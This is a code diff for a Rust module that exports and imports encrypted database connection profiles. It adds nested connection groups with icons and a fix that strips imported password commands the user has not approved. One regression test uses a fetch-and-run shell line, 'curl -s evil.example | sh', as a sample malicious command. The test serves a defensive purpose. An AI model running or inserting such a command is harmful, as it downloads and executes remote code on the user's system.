@@ -6,6 +6,9 @@
 //! with AES-256-GCM under a key derived from the password with PBKDF2-HMAC-SHA256; a wrong
 //! password and a modified file both fail authentication.
 //!
+//! Groups are paths (`Clients / Acme / Prod`) with an optional icon id. Version 1 files carried
+//! plain group names; they still read (as top-level groups without an icon).
+//!
 //! Pure: no Tauri, app DB or Keychain access (see `commands::profiles` for those).
 
 use std::collections::HashSet;
@@ -14,16 +17,18 @@ use std::num::NonZeroU32;
 use aws_lc_rs::{aead, pbkdf2, rand};
 use base64::Engine as _;
 use base64::engine::general_purpose::STANDARD as B64;
-use serde::{Deserialize, Serialize};
+use serde::{Deserialize, Deserializer, Serialize};
+use serde_json::Value;
 use uuid::Uuid;
 
 use crate::error::AppError;
-use crate::types::profile::{ConnectionProfile, ImportPreviewItem};
+use crate::types::profile::{ConnectionProfile, ImportPreviewItem, PasswordMode};
 
 /// `format` of every connections file.
 pub const FORMAT: &str = "tabler-connections";
-/// File layout version written by this build (files from newer builds are refused).
-pub const VERSION: u32 = 1;
+/// File layout version written by this build (files from newer builds are refused). Version 2
+/// stores groups as `{ path, icon }` records; version 1 stored plain names.
+pub const VERSION: u32 = 2;
 /// The file name extension (without the dot).
 pub const FILE_EXTENSION: &str = "tablerconnections";
 
@@ -38,7 +43,12 @@ const KEY_LEN: usize = 32;
 const KDF: &str = "pbkdf2-hmac-sha256";
 const CIPHER: &str = "aes-256-gcm";
 /// Bound to the ciphertext, so a sealed payload cannot be passed off as another kind of file.
+/// A domain tag, not the layout version: it stays the same so version 1 files still open.
 const AAD: &[u8] = b"tabler-connections/1";
+/// Between the levels of a group path.
+pub const GROUP_SEPARATOR: &str = " / ";
+/// Longest icon id kept (ids are short kebab-case names such as `hard-drive`).
+const MAX_ICON_LEN: usize = 40;
 
 /// Secrets of one exported connection; absent fields were not exported (or not stored).
 #[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
@@ -70,12 +80,22 @@ pub struct ExportedConnection {
     pub secrets: ExportedSecrets,
 }
 
-/// What a file carries: the connections and the group names (empty groups included).
+/// A connection group, as saved in the `connectionGroups` setting and in files: its path (levels
+/// joined by `GROUP_SEPARATOR`) and the id of its icon (`None`: the plain folder).
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(rename_all = "camelCase")]
+pub struct GroupRecord {
+    pub path: String,
+    #[serde(default)]
+    pub icon: Option<String>,
+}
+
+/// What a file carries: the connections and the groups (empty groups included).
 #[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
 #[serde(rename_all = "camelCase")]
 pub struct Payload {
-    #[serde(default)]
-    pub groups: Vec<String>,
+    #[serde(default, deserialize_with = "groups_of_any_version")]
+    pub groups: Vec<GroupRecord>,
     pub connections: Vec<ExportedConnection>,
 }
 
@@ -83,6 +103,149 @@ impl Payload {
     fn has_secrets(&self) -> bool {
         self.connections.iter().any(|c| !c.secrets.is_empty())
     }
+
+    /// The paths of the file's groups, in file order.
+    pub fn group_paths(&self) -> Vec<String> {
+        self.groups.iter().map(|g| g.path.clone()).collect()
+    }
+}
+
+fn groups_of_any_version<'de, D: Deserializer<'de>>(d: D) -> Result<Vec<GroupRecord>, D::Error> {
+    Ok(parse_groups(&Value::deserialize(d)?))
+}
+
+/// A group path in its canonical form: a `/` with white space on either side separates levels
+/// (so `CI/CD` stays one name), each level trimmed, empty levels dropped, joined with
+/// `GROUP_SEPARATOR`. Blank input gives "" (no group). Mirrors `normalizePath` in the renderer.
+pub fn normalize_group_path(raw: &str) -> String {
+    let chars: Vec<char> = raw.chars().collect();
+    let mut levels = Vec::new();
+    let mut current = String::new();
+    for (i, &c) in chars.iter().enumerate() {
+        let separates = c == '/'
+            && ((i > 0 && chars[i - 1].is_whitespace())
+                || chars.get(i + 1).is_some_and(|n| n.is_whitespace()));
+        if separates {
+            levels.push(std::mem::take(&mut current));
+        } else {
+            current.push(c);
+        }
+    }
+    levels.push(current);
+    levels
+        .iter()
+        .map(|l| l.trim())
+        .filter(|l| !l.is_empty())
+        .collect::<Vec<_>>()
+        .join(GROUP_SEPARATOR)
+}
+
+/// The ancestors of a (canonical, non-empty) path, outermost first, then the path itself.
+fn with_ancestors(path: &str) -> Vec<String> {
+    let levels: Vec<&str> = path.split(GROUP_SEPARATOR).collect();
+    (1..=levels.len())
+        .map(|n| levels[..n].join(GROUP_SEPARATOR))
+        .collect()
+}
+
+fn icon_id(raw: Option<&str>) -> Option<String> {
+    let id = raw?.trim();
+    let valid = !id.is_empty()
+        && id.len() <= MAX_ICON_LEN
+        && id
+            .chars()
+            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-');
+    valid.then(|| id.to_string())
+}
+
+/// Adds `path` (unless blank or already there; an existing group without an icon takes `icon`).
+fn add_group(out: &mut Vec<GroupRecord>, path: &str, icon: Option<String>) {
+    if path.is_empty() {
+        return;
+    }
+    match out.iter_mut().find(|g| g.path == path) {
+        Some(existing) => {
+            if existing.icon.is_none() {
+                existing.icon = icon;
+            }
+        }
+        None => out.push(GroupRecord {
+            path: path.to_string(),
+            icon,
+        }),
+    }
+}
+
+/// Reads saved or exported groups: records (`{ path, icon }`) or, from version 1, plain names.
+/// Anything else is skipped; paths are made canonical and kept once (first one wins).
+pub fn parse_groups(value: &Value) -> Vec<GroupRecord> {
+    let mut out = Vec::new();
+    for item in value.as_array().map(Vec::as_slice).unwrap_or_default() {
+        let (raw, icon) = match item {
+            Value::String(name) => (name.as_str(), None),
+            Value::Object(o) => match o.get("path").and_then(Value::as_str) {
+                Some(path) => (path, icon_id(o.get("icon").and_then(Value::as_str))),
+                None => continue,
+            },
+            _ => continue,
+        };
+        add_group(&mut out, &normalize_group_path(raw), icon);
+    }
+    out
+}
+
+fn icon_in(groups: &[GroupRecord], path: &str) -> Option<String> {
+    groups
+        .iter()
+        .find(|g| g.path == path)
+        .and_then(|g| g.icon.clone())
+}
+
+/// The groups an export writes: the `requested` ones (empty groups included) and those the
+/// exported connections `used`, each with its ancestors so the tree survives, with the icons
+/// saved in `stored`.
+pub fn export_groups(
+    stored: &[GroupRecord],
+    requested: &[String],
+    used: &[String],
+) -> Vec<GroupRecord> {
+    let mut out = Vec::new();
+    for raw in requested.iter().chain(used) {
+        let path = normalize_group_path(raw);
+        if path.is_empty() {
+            continue;
+        }
+        for p in with_ancestors(&path) {
+            let icon = icon_in(stored, &p);
+            add_group(&mut out, &p, icon);
+        }
+    }
+    out
+}
+
+/// The saved groups after an import: `known` (order and icons kept), plus the groups of the
+/// imported connections (`used`) and, when the whole file was imported, every group of the file
+/// (empty ones too), with their ancestors. Groups are matched by path; a new group, or a known
+/// one without an icon, takes the file's icon.
+pub fn merge_imported_groups(
+    known: &[GroupRecord],
+    file: &[GroupRecord],
+    used: &[String],
+    everything: bool,
+) -> Vec<GroupRecord> {
+    let mut out = known.to_vec();
+    let from_file = file.iter().filter(|_| everything).map(|g| &g.path);
+    for raw in used.iter().chain(from_file) {
+        let path = normalize_group_path(raw);
+        if path.is_empty() {
+            continue;
+        }
+        for p in with_ancestors(&path) {
+            let icon = icon_in(file, &p);
+            add_group(&mut out, &p, icon);
+        }
+    }
+    out
 }
 
 #[derive(Serialize, Deserialize)]
@@ -280,12 +443,26 @@ fn name_key(name: &str) -> String {
     name.trim().to_lowercase()
 }
 
+/// Takes the password command out of a profile: one that got its password from it ("Command
+/// Line (IAM authentication)") asks for it on every connect instead. The command runs through the
+/// user's shell on every connect, so it is treated like a secret: exported only with the
+/// passwords, imported only when the user chose to keep it after seeing it.
+pub fn drop_password_command(profile: &mut ConnectionProfile) {
+    profile.options.password_command = None;
+    if profile.options.password_mode == Some(PasswordMode::Command) {
+        profile.options.password_mode = Some(PasswordMode::Ask);
+    }
+}
+
 /// The connections chosen for import (by their id in the file), as new profiles: fresh ids,
 /// appended to the list (sort order 0 lets the app DB put them last), never connected. Secrets
-/// the profile cannot use (an SSH secret without SSH) are dropped.
+/// the profile cannot use (an SSH secret without SSH) are dropped, and so is every password
+/// command except those of `keep_commands` (ids in the file), which the user saw in the preview
+/// and chose to keep (see [`drop_password_command`]).
 pub fn plan_import(
     payload: &Payload,
     selected: &[Uuid],
+    keep_commands: &[Uuid],
 ) -> Vec<(ConnectionProfile, ExportedSecrets)> {
     let wanted: HashSet<Uuid> = selected.iter().copied().collect();
     payload
@@ -294,6 +471,10 @@ pub fn plan_import(
         .filter(|c| wanted.contains(&c.profile.id))
         .map(|c| {
             let mut profile = c.profile.clone();
+            if !keep_commands.contains(&profile.id) || profile.options.password_command().is_none()
+            {
+                drop_password_command(&mut profile);
+            }
             profile.id = Uuid::new_v4();
             profile.sort_order = 0;
             profile.created_at = String::new();
@@ -306,17 +487,6 @@ pub fn plan_import(
             }
             (profile, secrets)
         })
-        .collect()
-}
-
-/// Group names in first-seen order without duplicates or blanks: `known` first, then `extra`.
-pub fn merge_groups(known: &[String], extra: &[String]) -> Vec<String> {
-    let mut seen = HashSet::new();
-    known
-        .iter()
-        .chain(extra)
-        .map(|g| g.trim().to_string())
-        .filter(|g| !g.is_empty() && seen.insert(g.clone()))
         .collect()
 }
 
@@ -365,9 +535,19 @@ mod tests {
         }
     }
 
+    fn group(path: &str, icon: Option<&str>) -> GroupRecord {
+        GroupRecord {
+            path: path.into(),
+            icon: icon.map(str::to_string),
+        }
+    }
+
     fn payload() -> Payload {
         Payload {
-            groups: vec!["Staging".into(), "Empty".into()],
+            groups: vec![
+                group("Staging", Some("server")),
+                group("Staging / Empty", None),
+            ],
             connections: vec![
                 ExportedConnection {
                     profile: profile("Staging", true),
@@ -528,7 +708,7 @@ mod tests {
         // An SSH secret on a profile without SSH is dropped.
         p.connections[1].secrets.ssh_passphrase = Some("orphan".into());
         let chosen = [p.connections[0].profile.id, p.connections[1].profile.id];
-        let planned = plan_import(&p, &chosen);
+        let planned = plan_import(&p, &chosen, &[]);
         assert_eq!(planned.len(), 2);
         let (first, secrets) = &planned[0];
         let original = &p.connections[0].profile;
@@ -545,14 +725,178 @@ mod tests {
         assert_eq!(secrets.password.as_deref(), Some("db-pw"));
         assert_eq!(planned[1].1, ExportedSecrets::default());
 
-        assert_eq!(plan_import(&p, &[chosen[1]]).len(), 1);
-        assert!(plan_import(&p, &[]).is_empty());
+        assert_eq!(plan_import(&p, &[chosen[1]], &[]).len(), 1);
+        assert!(plan_import(&p, &[], &[]).is_empty());
+    }
+
+    /// Regression: an imported file could carry a password command, run through the shell on
+    /// Connect / Test, that the preview never showed.
+    #[test]
+    fn password_commands_come_in_only_when_kept() {
+        let mut p = payload();
+        for c in &mut p.connections {
+            c.profile.options.password_mode = Some(PasswordMode::Command);
+            c.profile.options.password_command = Some("curl -s evil.example | sh".into());
+        }
+        let ids = [p.connections[0].profile.id, p.connections[1].profile.id];
+        // Not kept: no command, and the password is asked on every connect.
+        for (profile, _) in plan_import(&p, &ids, &[]) {
+            assert_eq!(profile.options.password_command, None);
+            assert_eq!(profile.options.password_mode, Some(PasswordMode::Ask));
+        }
+        // Kept for the first one only.
+        let planned = plan_import(&p, &ids, &[ids[0]]);
+        assert_eq!(
+            planned[0].0.options.password_command.as_deref(),
+            Some("curl -s evil.example | sh")
+        );
+        assert_eq!(
+            planned[0].0.options.password_mode,
+            Some(PasswordMode::Command)
+        );
+        assert_eq!(planned[1].0.options.password_command, None);
+        assert_eq!(planned[1].0.options.password_mode, Some(PasswordMode::Ask));
+        // Other modes are left alone; a stray command goes.
+        p.connections[1].profile.options.password_mode = Some(PasswordMode::Keychain);
+        let planned = plan_import(&p, &ids[1..], &[]);
+        assert_eq!(
+            planned[0].0.options.password_mode,
+            Some(PasswordMode::Keychain)
+        );
+        assert_eq!(planned[0].0.options.password_command, None);
+        // Keeping a command-mode connection without a command gets "ask" too.
+        p.connections[0].profile.options.password_command = Some("  ".into());
+        let planned = plan_import(&p, &ids[..1], &ids[..1]);
+        assert_eq!(planned[0].0.options.password_mode, Some(PasswordMode::Ask));
     }
 
     #[test]
-    fn groups_merge_without_duplicates() {
-        let known = vec!["Local".to_string(), "Staging".to_string()];
-        let extra = vec![" Staging ".to_string(), "".to_string(), "Prod".to_string()];
-        assert_eq!(merge_groups(&known, &extra), ["Local", "Staging", "Prod"]);
+    fn group_paths_are_made_canonical() {
+        assert_eq!(
+            normalize_group_path(" Clients / Acme /Prod "),
+            "Clients / Acme / Prod"
+        );
+        assert_eq!(normalize_group_path("Clients/ Acme"), "Clients / Acme");
+        // A slash inside a word is part of the name.
+        assert_eq!(normalize_group_path("CI/CD"), "CI/CD");
+        assert_eq!(normalize_group_path("A / / B / "), "A / B");
+        assert_eq!(normalize_group_path("   "), "");
+        assert_eq!(
+            with_ancestors("Clients / Acme / Prod"),
+            ["Clients", "Clients / Acme", "Clients / Acme / Prod"]
+        );
+    }
+
+    #[test]
+    fn saved_groups_read_records_and_old_plain_names() {
+        let value = serde_json::json!([
+            "Local",
+            { "path": "Clients /Acme", "icon": "building" },
+            { "path": "Clients / Acme", "icon": "rocket" },
+            { "path": "Odd", "icon": "Not An Id!" },
+            { "icon": "server" },
+            42,
+            " "
+        ]);
+        assert_eq!(
+            parse_groups(&value),
+            [
+                group("Local", None),
+                group("Clients / Acme", Some("building")),
+                group("Odd", None)
+            ]
+        );
+        assert!(parse_groups(&serde_json::json!("Local")).is_empty());
+    }
+
+    #[test]
+    fn version_1_files_still_read() {
+        let v1 = br#"{"format":"tabler-connections","version":1,"exportedAt":"then",
+            "payload":{"groups":["Staging"," Empty "],"connections":[]}}"#;
+        let ReadOutcome::Opened { payload, .. } = read(v1, None).unwrap() else {
+            panic!("a plain file opens without a password");
+        };
+        assert_eq!(
+            payload.groups,
+            [group("Staging", None), group("Empty", None)]
+        );
+        assert_eq!(payload.group_paths(), ["Staging", "Empty"]);
+    }
+
+    #[test]
+    fn files_carry_nested_groups_with_their_icons() {
+        let mut p = payload();
+        for c in &mut p.connections {
+            c.secrets = ExportedSecrets::default();
+        }
+        let bytes = write_with_iterations(&p, None, "now", FAST).unwrap();
+        let envelope: serde_json::Value = serde_json::from_slice(&bytes).unwrap();
+        assert_eq!(envelope["version"], VERSION);
+        assert_eq!(
+            envelope["payload"]["groups"],
+            serde_json::json!([
+                { "path": "Staging", "icon": "server" },
+                { "path": "Staging / Empty", "icon": null }
+            ])
+        );
+        let ReadOutcome::Opened { payload, .. } = read(&bytes, None).unwrap() else {
+            panic!("plain file");
+        };
+        assert_eq!(payload.groups, p.groups);
+    }
+
+    #[test]
+    fn exports_take_the_ancestors_and_saved_icons() {
+        let stored = [
+            group("Clients", Some("briefcase")),
+            group("Clients / Acme", Some("building")),
+            group("Other", Some("star")),
+        ];
+        let requested = [
+            "Clients / Acme".to_string(),
+            "Clients / Acme / Empty".to_string(),
+        ];
+        let used = ["Clients / Acme / Prod".to_string(), " ".to_string()];
+        assert_eq!(
+            export_groups(&stored, &requested, &used),
+            [
+                group("Clients", Some("briefcase")),
+                group("Clients / Acme", Some("building")),
+                group("Clients / Acme / Empty", None),
+                group("Clients / Acme / Prod", None),
+            ]
+        );
+    }
+
+    #[test]
+    fn imports_merge_groups_by_path_and_keep_icons() {
+        let known = [group("Local", Some("home")), group("Clients", None)];
+        let file = [
+            group("Clients", Some("briefcase")),
+            group("Clients / Acme", Some("building")),
+            group("Local", Some("rocket")),
+            group("Archive", Some("archive")),
+        ];
+        let used = ["Clients / Acme".to_string()];
+        // Only some connections: their groups (and ancestors) come along, not the empty ones.
+        assert_eq!(
+            merge_imported_groups(&known, &file, &used, false),
+            [
+                group("Local", Some("home")),
+                group("Clients", Some("briefcase")),
+                group("Clients / Acme", Some("building")),
+            ]
+        );
+        // Everything: the file's empty groups too; a known icon is never replaced.
+        assert_eq!(
+            merge_imported_groups(&known, &file, &used, true),
+            [
+                group("Local", Some("home")),
+                group("Clients", Some("briefcase")),
+                group("Clients / Acme", Some("building")),
+                group("Archive", Some("archive")),
+            ]
+        );
+        assert_eq!(merge_imported_groups(&known, &[], &[], true), known);
     }
 }
